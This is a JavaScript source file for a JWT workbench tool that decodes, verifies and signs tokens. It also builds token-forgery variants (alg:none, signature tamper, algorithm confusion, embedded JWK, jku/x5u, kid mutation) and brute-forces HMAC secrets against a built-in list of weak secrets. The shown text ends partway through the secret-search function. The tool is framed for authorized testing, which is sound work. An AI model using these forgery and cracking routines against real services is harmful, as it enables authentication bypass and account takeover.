/* ==========================================================================
   CyberBuddy — JWT engine: decode, inspect, verify (JWT-01), edit,
   generate, sign (JWT-02) and authorized-test variants + bounded secret
   search (JWT-03)

   Pure, DOM-free functions shared by the browser controller, the secret
   test worker and the Node unit tests in test_engines.py. Nothing here
   touches the network, storage or history. Cryptography uses the standard
   Web Crypto API (globalThis.crypto.subtle), available in all modern
   browsers and Node 22+.

   JWT-01 scope (strict):
     - compact JWS decoding (header/payload/signature); JWE is rejected;
     - signature verification for HS256/384/512, RS256/384/512,
       PS256/384/512, ES256/384 via a key the ANALYST supplies;
     - expected-value validation for iss/aud/sub plus exp/nbf with skew;
     - contextual observations (never a numeric score or verdict).
   JWT-02 scope:
     - build a compact JWS from header/payload objects and sign it locally:
       HS256/384/512 with a string secret, RS/PS/ES with a private key;
     - private-key input as PEM PKCS#8 or a JWK that carries private
       material (d) — public keys can never sign;
     - local RSA test-key-pair generation for throwaway authorized testing;
     - a semantic original-vs-modified claim diff.
   JWT-03 scope:
     - authorized-test variant templates built on the analyzed token
       (alg:none, claim tamper + re-sign, algorithm confusion with a
       pasted public key, embedded JWK, jku/x5u, kid mutation) — the tool
       never sends them;
     - a bounded HMAC secret search (HS256/384/512 only) that runs in a
       Web Worker with progress, cancel and time/candidate limits.
   The engine never sends a JWT anywhere: no fetch of a JWKS URL, no
   target requests, no network/storage, and alg:none stays rejected by
   parseToken and signToken (it exists only as a labelled template).

   Accuracy rules enforced here:
     - we never trust the token's "alg" header to choose the verifier; the
       caller passes the expected alg (or the key's alg/JWK alg is used and
       matched), and a mismatch fails verification;
     - HMAC algs only accept symmetric (string) keys; RS/PS/ES only accept
       public keys (PEM/JWK/JWKS) for verify and private keys for sign —
       this blocks algorithm-confusion in both directions;
     - decoding is reported separately from signature/claim verification;
       a signed token is a TEST TOKEN and a variant is a TEST TEMPLATE
       until the target honors them.
   ========================================================================== */
"use strict";

(function (root, factory) {
  var api = factory();
  if (typeof module === "object" && module.exports) module.exports = api;
  root.CyberBuddyJwt = api;
})(typeof globalThis !== "undefined" ? globalThis : this, function () {

  function b64urlDecode(str) {
    if (typeof str !== "string") throw new TypeError("base64url: expected string");
    str = str.replace(/-/g, "+").replace(/_/g, "/");
    while (str.length % 4) str += "=";
    if (typeof atob === "function") {
      var bin = atob(str);
      var bytes = new Uint8Array(bin.length);
      for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      return bytes;
    }
    if (typeof Buffer !== "undefined") return new Uint8Array(Buffer.from(str, "base64"));
    throw new Error("No base64 decoder available");
  }

  function b64urlEncode(bytes) {
    var str = "";
    for (var i = 0; i < bytes.length; i++) str += String.fromCharCode(bytes[i]);
    var b64;
    if (typeof btoa === "function") b64 = btoa(str);
    else if (typeof Buffer !== "undefined") b64 = Buffer.from(bytes).toString("base64");
    else throw new Error("No base64 encoder available");
    return b64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  }

  var SUPPORTED_ALGS = {
    HS256: { name: "HMAC", hash: "SHA-256", kty: "oct" },
    HS384: { name: "HMAC", hash: "SHA-384", kty: "oct" },
    HS512: { name: "HMAC", hash: "SHA-512", kty: "oct" },
    RS256: { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256", kty: "RSA" },
    RS384: { name: "RSASSA-PKCS1-v1_5", hash: "SHA-384", kty: "RSA" },
    RS512: { name: "RSASSA-PKCS1-v1_5", hash: "SHA-512", kty: "RSA" },
    PS256: { name: "RSA-PSS", hash: "SHA-256", kty: "RSA", pss: true },
    PS384: { name: "RSA-PSS", hash: "SHA-384", kty: "RSA", pss: true },
    PS512: { name: "RSA-PSS", hash: "SHA-512", kty: "RSA", pss: true },
    ES256: { name: "ECDSA", hash: "SHA-256", kty: "EC", namedCurve: "P-256" },
    ES384: { name: "ECDSA", hash: "SHA-384", kty: "EC", namedCurve: "P-384" }
  };

  function algSpec(alg) {
    return alg && Object.prototype.hasOwnProperty.call(SUPPORTED_ALGS, alg)
      ? SUPPORTED_ALGS[alg] : null;
  }

  /* Parse the compact JWS structure without any key or verification.
     Returns {raw, header, payload, signature, signingInput} or throws. */
  function parseToken(raw) {
    if (typeof raw !== "string") throw new Error("Token must be a string");
    var s = raw.trim();
    if (!s) throw new Error("Empty token");
    if (s.split(".").length === 5) {
      throw new Error("JWE (encrypted) tokens are not supported in JWT-01");
    }
    var parts = s.split(".");
    if (parts.length !== 3) {
      throw new Error("A compact JWS must have three dot-separated parts");
    }
    var headerBytes, payloadBytes;
    try { headerBytes = b64urlDecode(parts[0]); }
    catch (e) { throw new Error("Header is not valid base64url"); }
    try { payloadBytes = b64urlDecode(parts[1]); }
    catch (e) { throw new Error("Payload is not valid base64url"); }
    var header, payload;
    try { header = JSON.parse(new TextDecoder().decode(headerBytes)); }
    catch (e) { throw new Error("Header is not valid JSON"); }
    try { payload = JSON.parse(new TextDecoder().decode(payloadBytes)); }
    catch (e) { throw new Error("Payload is not valid JSON"); }
    if (!header || typeof header !== "object") throw new Error("Header is not a JSON object");
    if (!payload || typeof payload !== "object") throw new Error("Payload is not a JSON object");
    var alg = header.alg;
    if (!alg) throw new Error("Header has no alg");
    if (!algSpec(alg)) throw new Error("Unsupported alg: " + alg);
    if (!parts[2]) throw new Error("Token has no signature");
    var sig;
    try { sig = b64urlDecode(parts[2]); }
    catch (e) { throw new Error("Signature is not valid base64url"); }
    if (!sig.length) throw new Error("Token has an empty signature");
    if (header.alg === "none") throw new Error("alg:none is unsigned and cannot be verified");
    return {
      raw: s,
      header: header,
      payload: payload,
      signature: sig,
      signingInput: parts[0] + "." + parts[1]
    };
  }

  function tryParseToken(raw) {
    try { return { ok: true, token: parseToken(raw) }; }
    catch (e) { return { ok: false, error: e.message }; }
  }

  /* Contextual observations. These are advisory flags, not findings or a
     score. They only describe the decoded token; they never assert
     vulnerability. */
  function observations(parsed) {
    var out = [];
    function obs(level, code, message) { out.push({ level: level, code: code, message: message }); }
    var h = parsed.header, p = parsed.payload;
    if (h.alg === "none") obs("high", "alg-none", "Token declares alg:none — it is unsigned.");
    if (!Object.prototype.hasOwnProperty.call(p, "exp"))
      obs("info", "no-exp", "No exp claim — the token never expires (context-dependent).");
    if (!Object.prototype.hasOwnProperty.call(p, "iat"))
      obs("info", "no-iat", "No iat claim.");
    if (!Object.prototype.hasOwnProperty.call(p, "nbf"))
      obs("info", "no-nbf", "No nbf claim.");
    if (!Object.prototype.hasOwnProperty.call(p, "iss"))
      obs("info", "no-iss", "No iss claim.");
    if (!Object.prototype.hasOwnProperty.call(p, "aud"))
      obs("info", "no-aud", "No aud claim.");
    if (Object.prototype.hasOwnProperty.call(p, "exp") && typeof p.exp === "number"
        && Object.prototype.hasOwnProperty.call(p, "iat") && typeof p.iat === "number") {
      var lifetime = p.exp - p.iat;
      if (lifetime > 24 * 3600)
        obs("info", "long-lifetime", "Lifetime exceeds 24 hours — widens the replay window if the token leaks.");
    }
    if (h.jku) obs("high", "jku", "Header carries a jku URL; verify it only if your trust policy pins it.");
    if (h.x5u) obs("high", "x5u", "Header carries an x5u URL; verify it only if your trust policy pins it.");
    if (h.jwk) obs("high", "jwk", "Header carries an embedded jwk; do not trust a key supplied by the token.");
    if (h.kid != null) obs("info", "kid", "Key id present: " + String(h.kid));
    var spec = algSpec(h.alg);
    if (spec && spec.kty === "oct" && h.alg && /^HS/.test(h.alg))
      obs("info", "hmac", "HMAC token — verification needs the shared secret.");
    return out;
  }

  function normalizeTime(t) {
    if (t == null) return null;
    var n = Number(t);
    if (!isFinite(n)) return null;
    return n;
  }

  /* Validate registered claims. Returns {valid, errors}. This is claim
     validation only — it does not prove the signature. */
  function validateClaims(payload, opts) {
    opts = opts || {};
    var errors = [];
    var now = Math.floor(Date.now() / 1000);
    var clockTolerance = Number(opts.clockTolerance) || 0;
    var exp = normalizeTime(payload.exp);
    if (exp != null && now > exp + clockTolerance) {
      errors.push({ code: "exp", message: "Token has expired" });
    }
    var nbf = normalizeTime(payload.nbf);
    if (nbf != null && now < nbf - clockTolerance) {
      errors.push({ code: "nbf", message: "Token is not yet valid (nbf)" });
    }
    if (opts.iss != null && payload.iss !== opts.iss) {
      errors.push({ code: "iss", message: "Issuer mismatch" });
    }
    if (opts.aud != null) {
      var aud = payload.aud;
      var audList = Array.isArray(aud) ? aud : (aud == null ? [] : [aud]);
      if (audList.indexOf(opts.aud) === -1) {
        errors.push({ code: "aud", message: "Audience mismatch" });
      }
    }
    if (opts.sub != null && payload.sub !== opts.sub) {
      errors.push({ code: "sub", message: "Subject mismatch" });
    }
    return { valid: errors.length === 0, errors: errors };
  }

  function pemToArrayBuffer(pem) {
    var b64 = pem.replace(/-----[A-Z ]+-----/g, "").replace(/\s+/g, "");
    var bin = atob(b64);
    var bytes = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return bytes.buffer;
  }

  function looksLikePem(k) {
    return typeof k === "string" && /-----BEGIN [A-Z ]+-----/.test(k);
  }

  function crypto() {
    var g = typeof globalThis !== "undefined" ? globalThis
      : (typeof window !== "undefined" ? window : this);
    var c = g.crypto || (typeof require === "function" && require("crypto").webcrypto);
    if (!c || !c.subtle) throw new Error("Web Crypto is not available in this environment");
    return c;
  }

  function importPublicKey(spec, keyData, algHint) {
    var c = crypto();
    var algorithm = { name: spec.name, hash: { name: spec.hash } };
    if (spec.pss) algorithm.saltLength = spec.hash === "SHA-256" ? 32 : spec.hash === "SHA-384" ? 48 : 64;
    if (spec.namedCurve) algorithm.namedCurve = spec.namedCurve;
    var key;
    if (looksLikePem(keyData)) {
      key = pemToArrayBuffer(keyData);
      return c.subtle.importKey("spki", key, algorithm, false, ["verify"]);
    }
    if (keyData && typeof keyData === "object") {
      // Enforce the key type matches the algorithm family.
      if (keyData.kty !== spec.kty) {
        return Promise.reject(new Error("Key type (" + keyData.kty + ") does not match algorithm " + algHint));
      }
      var jwk = Object.assign({}, keyData);
      if (!jwk.alg && algHint) jwk.alg = algHint;
      return c.subtle.importKey("jwk", jwk, algorithm, false, ["verify"]);
    }
    return Promise.reject(new Error("Public key must be PEM SPKI or a JWK object"));
  }

  function importSecret(spec, secret, usages) {
    if (typeof secret !== "string" || secret.length === 0) {
      return Promise.reject(new Error("HMAC requires a non-empty shared secret string"));
    }
    var c = crypto();
    var keyData = new TextEncoder().encode(secret);
    return c.subtle.importKey("raw", keyData, { name: "HMAC", hash: spec.hash }, false, usages || ["verify"]);
  }

  /* Pick a JWKS key: match by kid when the token has one, else use a single
     RSA/EC key. The selected key's family must match the expected alg. */
  function pickJwksKey(jwks, kid, spec) {
    if (!jwks || !Array.isArray(jwks.keys)) throw new Error("JWKS must contain a keys array");
    var matches = jwks.keys.filter(function (k) { return k && typeof k === "object"; });
    if (kid != null) matches = matches.filter(function (k) { return k.kid === kid; });
    if (!matches.length) throw new Error("No matching key found in JWKS" + (kid != null ? " for kid " + kid : ""));
    var compatible = matches.filter(function (k) { return k.kty === spec.kty; });
    if (!compatible.length) {
      throw new Error("No " + spec.kty + " key in JWKS matches the expected algorithm family");
    }
    return compatible[0];
  }

  function asUint8(buf) { return buf instanceof ArrayBuffer ? new Uint8Array(buf) : buf; }

  /* Verify a token's signature. `key` may be:
       - a non-empty string  -> HMAC shared secret (HS* only);
       - a PEM SPKI string  -> RSA/EC public key;
       - a JWK object       -> RSA/EC public key (kty must match);
       - a JWKS object      -> {keys:[...]}, selected by kid.
     opts.alg pins the expected algorithm. If omitted, the key's alg is used
     (JWK) or, for JWKS, the matching key's alg. The token header alg is
     always matched against the expected alg and must agree.
     Returns Promise<{valid, alg, keyMatched, error}>. */
  function verifyToken(raw, key, opts) {
    opts = opts || {};
    var parsed;
    try { parsed = parseToken(raw); }
    catch (e) { return Promise.resolve({ valid: false, error: e.message }); }

    var spec = algSpec(parsed.header.alg);
    var expectedAlg = opts.alg || (key && typeof key === "object" && !Array.isArray(key) && key.kty && key.alg) || null;
    if (expectedAlg && expectedAlg !== parsed.header.alg) {
      return Promise.resolve({ valid: false, error: "Algorithm mismatch: header says " + parsed.header.alg + ", expected " + expectedAlg });
    }

    var keyTask;
    if (spec.kty === "oct") {
      // HMAC: only a symmetric string secret works. Reject anything that
      // looks like a public key (PEM or object) — this is what blocks
      // "sign HS256 with the RSA public key" algorithm confusion.
      if (typeof key !== "string" || looksLikePem(key)) {
        return Promise.resolve({ valid: false, error: "HMAC verification requires the shared secret string (not a public key)" });
      }
      keyTask = importSecret(spec, key);
    } else if (looksLikePem(key)) {
      keyTask = importPublicKey(spec, key, parsed.header.alg);
    } else if (key && typeof key === "object" && Array.isArray(key.keys)) {
      var jwk;
      try { jwk = pickJwksKey(key, parsed.header.kid, spec); }
      catch (e) { return Promise.resolve({ valid: false, error: e.message }); }
      if (jwk.alg && jwk.alg !== parsed.header.alg) {
        return Promise.resolve({ valid: false, error: "JWKS key alg (" + jwk.alg + ") does not match token alg (" + parsed.header.alg + ")" });
      }
      keyTask = importPublicKey(spec, jwk, parsed.header.alg);
    } else if (key && typeof key === "object") {
      keyTask = importPublicKey(spec, key, parsed.header.alg);
    } else {
      return Promise.resolve({ valid: false, error: "A key is required to verify the signature" });
    }

    var signingInput = new TextEncoder().encode(parsed.signingInput);
    var algorithm = { name: spec.name, hash: { name: spec.hash } };
    if (spec.pss) algorithm.saltLength = spec.hash === "SHA-256" ? 32 : spec.hash === "SHA-384" ? 48 : 64;

    return keyTask.then(function (cryptoKey) {
      return crypto().subtle.verify(algorithm, cryptoKey, asUint8(parsed.signature), signingInput);
    }).then(function (ok) {
      if (!ok) return { valid: false, alg: parsed.header.alg, error: "Signature does not match" };
      return { valid: true, alg: parsed.header.alg, keyMatched: true };
    }).catch(function (err) {
      return { valid: false, alg: parsed.header.alg, error: err && err.message ? err.message : String(err) };
    });
  }

  /* ========================================================================
     JWT-02 — edit & generate
     ======================================================================== */

  function encodePart(obj) {
    var json = JSON.stringify(obj);
    if (typeof json !== "string") throw new Error("Value is not JSON-serializable");
    return b64urlEncode(new TextEncoder().encode(json));
  }

  function isCryptoKey(k) {
    return k && typeof k === "object" &&
      (k.type === "public" || k.type === "private" || k.type === "secret") &&
      k.algorithm && Array.isArray(k.usages);
  }

  /* Import a private key for signing. PEM must be PKCS#8 — Web Crypto
     cannot import PKCS#1/SEC1 or encrypted PEM — and a JWK must carry
     private material (d) with a kty matching the algorithm family. */
  function importPrivateKey(spec, keyData, algHint) {
    var c = crypto();
    var algorithm = { name: spec.name, hash: { name: spec.hash } };
    if (spec.pss) algorithm.saltLength = spec.hash === "SHA-256" ? 32 : spec.hash === "SHA-384" ? 48 : 64;
    if (spec.namedCurve) algorithm.namedCurve = spec.namedCurve;
    if (looksLikePem(keyData)) {
      if (/BEGIN (RSA |EC )?PRIVATE KEY/.test(keyData)) {
        if (/BEGIN (RSA |EC )PRIVATE KEY/.test(keyData)) {
          return Promise.reject(new Error("PKCS#1/SEC1 private keys are not supported by Web Crypto — convert to PKCS#8 (BEGIN PRIVATE KEY)"));
        }
        if (/BEGIN ENCRYPTED PRIVATE KEY/.test(keyData)) {
          return Promise.reject(new Error("Encrypted private keys are not supported — decrypt them locally first"));
        }
        return c.subtle.importKey("pkcs8", pemToArrayBuffer(keyData), algorithm, false, ["sign"]);
      }
      if (/BEGIN PUBLIC KEY/.test(keyData)) {
        return Promise.reject(new Error("A public key cannot sign — supply the private key"));
      }
      return Promise.reject(new Error("Unrecognised PEM — supply a PKCS#8 private key (BEGIN PRIVATE KEY)"));
    }
    if (keyData && typeof keyData === "object") {
      if (Array.isArray(keyData.keys)) {
        return Promise.reject(new Error("Signing uses one private key — a JWKS holds public keys"));
      }
      if (keyData.kty !== spec.kty) {
        return Promise.reject(new Error("Key type (" + keyData.kty + ") does not match algorithm " + algHint));
      }
      if (!keyData.d) {
        return Promise.reject(new Error("This key has no private material (d is missing) — a public key cannot sign"));
      }
      if (Array.isArray(keyData.key_ops) && keyData.key_ops.indexOf("sign") === -1) {
        return Promise.reject(new Error("Key usage (key_ops) does not allow signing"));
      }
      var jwk = Object.assign({}, keyData);
      if (!jwk.alg && algHint) jwk.alg = algHint;
      return c.subtle.importKey("jwk", jwk, algorithm, false, ["sign"]);
    }
    return Promise.reject(new Error("Private key must be PEM PKCS#8 or a JWK object"));
  }

  /* Sign header + payload and return the compact JWS.
     `key` may be:
       - a non-empty string  -> HMAC shared secret (HS* only);
       - a PEM PKCS#8 string -> RSA/EC private key;
       - a JWK object with "d" -> RSA/EC private key (kty must match);
       - a CryptoKey object  -> private key whose algorithm matches.
     opts.alg pins the expected algorithm and must agree with header.alg.
     Resolves {token, alg, header, payload} on success or {error} on
     failure. alg:none, public keys and alg confusion are rejected. */
  function signToken(header, payload, key, opts) {
    opts = opts || {};
    if (!header || typeof header !== "object" || Array.isArray(header)) {
      return Promise.resolve({ error: "Header must be a JSON object" });
    }
    if (!payload || typeof payload !== "object" || Array.isArray(payload)) {
      return Promise.resolve({ error: "Payload must be a JSON object" });
    }
    var alg = header.alg;
    if (!alg) return Promise.resolve({ error: "Header has no alg" });
    if (alg === "none") {
      return Promise.resolve({ error: "alg:none is unsigned — the Workbench neither signs nor produces it" });
    }
    var spec = algSpec(alg);
    if (!spec) return Promise.resolve({ error: "Unsupported alg: " + alg });
    if (opts.alg && opts.alg !== alg) {
      return Promise.resolve({ error: "Algorithm mismatch: header says " + alg + ", expected " + opts.alg });
    }

    var keyTask;
    if (spec.kty === "oct") {
      // HMAC signing uses a string secret only — a pasted public or private
      // key must never be used as the HMAC secret (algorithm confusion).
      if (typeof key !== "string" || !key.length || looksLikePem(key)) {
        return Promise.resolve({ error: "HMAC signing requires the shared secret string (not a public/private key)" });
      }
      keyTask = importSecret(spec, key, ["sign"]);
    } else if (isCryptoKey(key)) {
      keyTask = Promise.resolve(key).then(function (ck) {
        if (ck.type === "public") throw new Error("A public key cannot sign — supply the private key");
        if (ck.type !== "private") throw new Error("An asymmetric algorithm needs a private CryptoKey");
        if (ck.algorithm && ck.algorithm.name !== spec.name) {
          throw new Error("Key algorithm (" + ck.algorithm.name + ") does not match " + alg);
        }
        if (spec.namedCurve && ck.algorithm && ck.algorithm.namedCurve !== spec.namedCurve) {
          throw new Error("Key curve does not match " + alg);
        }
        return ck;
      });
    } else if (looksLikePem(key)) {
      keyTask = importPrivateKey(spec, key, alg);
    } else if (key && typeof key === "object") {
      keyTask = importPrivateKey(spec, key, alg);
    } else {
      return Promise.resolve({ error: "A private key is required to sign" });
    }

    var signingInput;
    try {
      signingInput = encodePart(header) + "." + encodePart(payload);
    } catch (e) {
      return Promise.resolve({ error: e.message });
    }

    var algorithm = { name: spec.name, hash: { name: spec.hash } };
    if (spec.pss) algorithm.saltLength = spec.hash === "SHA-256" ? 32 : spec.hash === "SHA-384" ? 48 : 64;
    if (spec.namedCurve) algorithm.namedCurve = spec.namedCurve;

    return keyTask.then(function (ck) {
      return crypto().subtle.sign(algorithm, ck, new TextEncoder().encode(signingInput));
    }).then(function (sig) {
      return {
        token: signingInput + "." + b64urlEncode(asUint8(sig)),
        alg: alg,
        header: header,
        payload: payload
      };
    }).catch(function (err) {
      return { error: err && err.message ? err.message : String(err) };
    });
  }

  /* Generate a local RSA key pair for throwaway authorized testing.
     RSA algorithms only (RS256/384/512, PS256/384/512) — Web Crypto's RSA
     key generation is per-signature-family. The pair stays in memory; only
     the PUBLIC JWK is handed back by default (the UI must ask explicitly
     before exporting the private one). */
  function generateRsaTestPair(alg) {
    var spec = algSpec(alg);
    if (!spec || spec.kty !== "RSA") {
      return Promise.resolve({ error: "Test-key generation supports RSA algorithms (RS256/384/512, PS256/384/512)" });
    }
    var c = crypto();
    var algorithm = {
      name: spec.name,
      modulusLength: 2048,
      publicExponent: new Uint8Array([1, 0, 1]),
      hash: spec.hash
    };
    return c.subtle.generateKey(algorithm, true, ["sign", "verify"]).then(function (pair) {
      return c.subtle.exportKey("jwk", pair.publicKey).then(function (publicJwk) {
        publicJwk.alg = alg;
        return { alg: alg, privateKey: pair.privateKey, publicKey: pair.publicKey, publicJwk: publicJwk };
      });
    }).catch(function (err) {
      return { error: err && err.message ? err.message : String(err) };
    });
  }

  /* Explicit key export. The controller calls these only on explicit user
     action — the UI confirms before exporting a private key, so key
     material never leaves memory by accident. */
  function exportPrivateJwk(key) {
    if (!isCryptoKey(key)) return Promise.reject(new Error("Not a CryptoKey"));
    if (key.type !== "private") return Promise.reject(new Error("Key is not a private key"));
    return crypto().subtle.exportKey("jwk", key);
  }

  function exportPublicJwk(key) {
    if (!isCryptoKey(key)) return Promise.reject(new Error("Not a CryptoKey"));
    if (key.type !== "public") return Promise.reject(new Error("Key is not a public key"));
    return crypto().subtle.exportKey("jwk", key);
  }

  /* Semantic diff between two claim objects (header or payload) at
     top-level claim granularity: added / removed / changed / unchanged,
     values compared by JSON serialization. */
  function diffClaims(original, modified) {
    original = original && typeof original === "object" ? original : {};
    modified = modified && typeof modified === "object" ? modified : {};
    var seen = {};
    var out = [];
    Object.keys(original).forEach(function (k) { seen[k] = true; });
    Object.keys(modified).forEach(function (k) { seen[k] = true; });
    Object.keys(seen).sort().forEach(function (k) {
      var inO = Object.prototype.hasOwnProperty.call(original, k);
      var inM = Object.prototype.hasOwnProperty.call(modified, k);
      var ov = JSON.stringify(original[k]);
      var mv = JSON.stringify(modified[k]);
      if (!inO) out.push({ claim: k, kind: "added", from: null, to: modified[k] });
      else if (!inM) out.push({ claim: k, kind: "removed", from: original[k], to: null });
      else if (ov !== mv) out.push({ claim: k, kind: "changed", from: original[k], to: modified[k] });
      else out.push({ claim: k, kind: "unchanged", from: original[k], to: original[k] });
    });
    return out;
  }

  /* ========================================================================
     JWT-03 — authorized-test variant templates & bounded secret search
     ======================================================================== */

  /* Small built-in candidate list for bounded secret testing — a starter
     set, not a bundled wordlist (a real wordlist is uploaded by the
     analyst). */
  var BUILTIN_SECRET_CANDIDATES = [
    "secret", "password", "changeme", "changeit", "admin", "administrator",
    "root", "test", "testing", "jwt", "jwt-secret", "jwtsecret",
    "secret-key", "secretkey", "mysecret", "supersecret", "topsecret",
    "key", "token", "123456", "12345678", "1234567890", "qwerty",
    "letmein", "default", "privatekey", "publickey", "HS256", "HS384",
    "HS512", "abc123", "passw0rd"
  ];

  function cloneJson(v) {
    return JSON.parse(JSON.stringify(v));
  }

  function assertJsonObject(v, name) {
    if (!v || typeof v !== "object" || Array.isArray(v)) {
      throw new Error(name + " must be a JSON object");
    }
  }

  /* Parse a claim value typed by an analyst: JSON when it parses
     (numbers, booleans, null, arrays, objects), otherwise a string. */
  function claimValue(v) {
    if (typeof v !== "string") return v;
    var t = v.trim();
    if (t === "") return "";
    try { return JSON.parse(t); } catch (e) { return v; }
  }

  /* alg:none template: the header's alg is forced to none and the
     signature segment is empty. This exists ONLY as an explicitly labelled
     authorized-test template — the parse and sign paths keep rejecting
     alg:none. */
  function unsignedToken(header, payload) {
    assertJsonObject(header, "Header");
    assertJsonObject(payload, "Payload");
    var h = cloneJson(header);
    h.alg = "none";
    var p = cloneJson(payload);
    var signingInput = encodePart(h) + "." + encodePart(p);
    return { token: signingInput + ".", header: h, payload: p, signingInput: signingInput };
  }

  /* Tamper template: new header/payload but the ORIGINAL signature is kept.
     Tests whether the target verifies the signature at all. */
  function tamperToken(parsed, header, payload) {
    if (!parsed || !parsed.signature || !parsed.signingInput) {
      throw new Error("A parsed base token is required");
    }
    assertJsonObject(header, "Header");
    assertJsonObject(payload, "Payload");
    var h = cloneJson(header);
    var p = cloneJson(payload);
    var signingInput = encodePart(h) + "." + encodePart(p);
    return {
      token: signingInput + "." + b64urlEncode(parsed.signature),
      header: h,
      payload: p,
      signingInput: signingInput
    };
  }

  /* Algorithm-confusion template: HS256-signed with the target's RSA
     public key text used as the HMAC secret. Only meaningful when the
     target treats a public key as a shared HMAC secret. The public key is
     supplied (pasted) by the analyst — never fetched. */
  function algorithmConfusionToken(parsed, publicKeyPem) {
    if (!parsed || !parsed.header || !parsed.payload) {
      return Promise.reject(new Error("A parsed base token is required"));
    }
    if (!looksLikePem(publicKeyPem) || !/BEGIN PUBLIC KEY/.test(publicKeyPem)) {
      return Promise.reject(new Error("The confusion template uses the target's RSA public key (PEM) as the HMAC secret"));
    }
    var h = cloneJson(parsed.header);
    h.alg = "HS256";
    var p = cloneJson(parsed.payload);
    var signingInput = encodePart(h) + "." + encodePart(p);
    return importSecret(algSpec("HS256"), publicKeyPem, ["sign"]).then(function (ck) {
      return crypto().subtle.sign({ name: "HMAC", hash: { name: "SHA-256" } }, ck, new TextEncoder().encode(signingInput));
    }).then(function (sig) {
      return {
        token: signingInput + "." + b64urlEncode(asUint8(sig)),
        header: h,
        payload: p,
        signingInput: signingInput
      };
    });
  }

  /* The public subset of a private JWK — RSA: n/e, EC: x/y. Used by the
     embedded-JWK template when the analyst pasted a private JWK. */
  function publicJwkFromPrivate(jwk) {
    if (!jwk || typeof jwk !== "object" || !jwk.d) {
      throw new Error("Key has no private material (d)");
    }
    if (jwk.kty === "RSA") {
      if (!jwk.n || !jwk.e) throw new Error("Incomplete RSA private JWK");
      return { kty: "RSA", n: jwk.n, e: jwk.e, alg: jwk.alg };
    }
    if (jwk.kty === "EC") {
      if (!jwk.crv || !jwk.x || !jwk.y) throw new Error("Incomplete EC private JWK");
      return { kty: "EC", crv: jwk.crv, x: jwk.x, y: jwk.y, alg: jwk.alg };
    }
    throw new Error("Cannot derive a public JWK from kty " + jwk.kty);
  }

  var VARIANT_NOTES = {
    "alg-none": "alg:none, empty signature — tests whether the target accepts an unsigned token.",
    "tamper": "Claim changed, original signature kept — tests whether the target verifies the signature at all.",
    "claim-resign": "Claim changed and re-signed with your key — tests whether the target accepts the modified claim.",
    "alg-confusion": "HS256 signed with the target's public key as the HMAC secret — valid only where the verifier confuses a public key with a shared secret.",
    "embedded-jwk": "The token carries its own public JWK in the header and is signed with the matching private key — tests header-key trust.",
    "jku": "Header points at an analyst-controlled jku URL (you host the key set); the tool makes no request to it.",
    "x5u": "Header points at an analyst-controlled x5u URL (you host the certificate); the tool makes no request to it.",
    "kid": "Mutated kid header, re-signed with your key — tests whether the target's key selection trusts the kid."
  };

  /* One entry point for every authorized-test variant template. `parsed`
     is the analyzed base token. Types:
       alg-none         opts: {}
       tamper           opts: {claim, value}        (original signature kept)
       claim-resign     opts: {claim, value, alg, key}
       alg-confusion    opts: {publicKeyPem}
       embedded-jwk     opts: {publicJwk, alg, key}
       jku / x5u        opts: {url, alg, key}
       kid              opts: {kid, alg, key}
     Re-signed variants go through signToken, so every JWT-02 guard
     (alg pin, no public-key signing, no alg:none) still applies.
     Resolves {type, token, header, payload, note} or {error}. */
  function buildVariant(parsed, type, opts) {
    opts = opts || {};
    if (!parsed || !parsed.header || !parsed.payload) {
      return Promise.resolve({ error: "Paste and decode a base token first — variants build on the analyzed token." });
    }
    var header = cloneJson(parsed.header);
    var payload = cloneJson(parsed.payload);
    var task;
    try {
      if (type === "alg-none") {
        task = Promise.resolve(unsignedToken(header, payload));
      } else if (type === "tamper") {
        if (!opts.claim) return Promise.resolve({ error: "Name the claim to modify." });
        payload[opts.claim] = claimValue(opts.value);
        task = Promise.resolve(tamperToken(parsed, header, payload));
      } else if (type === "claim-resign") {
        if (!opts.claim) return Promise.resolve({ error: "Name the claim to modify." });
        payload[opts.claim] = claimValue(opts.value);
        task = signToken(header, payload, opts.key, { alg: opts.alg });
      } else if (type === "alg-confusion") {
        task = algorithmConfusionToken(parsed, opts.publicKeyPem);
      } else if (type === "embedded-jwk") {
        if (!opts.publicJwk) return Promise.resolve({ error: "The embedded-JWK template needs the public JWK of the signing key." });
        header.jwk = cloneJson(opts.publicJwk);
        task = signToken(header, payload, opts.key, { alg: opts.alg });
      } else if (type === "jku" || type === "x5u") {
        if (!opts.url) return Promise.resolve({ error: "Supply the URL the template should carry." });
        header[type] = opts.url;
        task = signToken(header, payload, opts.key, { alg: opts.alg });
      } else if (type === "kid") {
        if (opts.kid == null || opts.kid === "") return Promise.resolve({ error: "Supply the kid value." });
        header.kid = opts.kid;
        task = signToken(header, payload, opts.key, { alg: opts.alg });
      } else {
        return Promise.resolve({ error: "Unknown variant type: " + type });
      }
    } catch (e) {
      return Promise.resolve({ error: e.message });
    }
    return task.then(function (res) {
      if (!res || res.error) return res;
      return { type: type, token: res.token, header: res.header, payload: res.payload, note: VARIANT_NOTES[type] || "" };
    }).catch(function (err) {
      return { error: err && err.message ? err.message : String(err) };
    });
  }

  function timingSafeEqual(a, b) {
    var d = 0;
    for (var i = 0; i < a.length; i++) d |= a[i] ^ b[i];
    return d === 0;
  }

  /* Bounded HMAC secret search (HS256/384/512 only) — used by the secret
     test worker. `candidates` is a string array; `shouldContinue` allows
     cancel/timeout; `onProgress` fires every 250 candidates with
     {tested, total, found}. Resolves {found, secret, tested, total}.
     Never performs RSA/EC operations and never touches the network. */
  function searchHmacSecret(opts) {
    opts = opts || {};
    var spec = algSpec(opts.alg);
    if (!spec || spec.kty !== "oct") {
      return Promise.reject(new Error("Secret testing covers HS256/384/512 only"));
    }
    if (!opts.candidates || !Array.isArray(opts.candidates) || !opts.candidates.length) {
      return Promise.reject(new Error("candidates must be a non-empty array"));
    }
    var target = asUint8(opts.signature);
    var input = new TextEncoder().encode(opts.signingInput);
    var c = crypto();
    var shouldContinue = opts.shouldContinue || function () { return true; };
    var onProgress = opts.onProgress || function () {};
    var total = opts.candidates.length;
    var tested = 0;
    var found = false;
    var foundSecret = null;

    function step(i) {
      if (!shouldContinue()) return Promise.resolve(null);
      var cand = opts.candidates[i];
      if (typeof cand !== "string") cand = String(cand);
      return c.subtle.importKey("raw", new TextEncoder().encode(cand), { name: "HMAC", hash: spec.hash }, false, ["sign"])
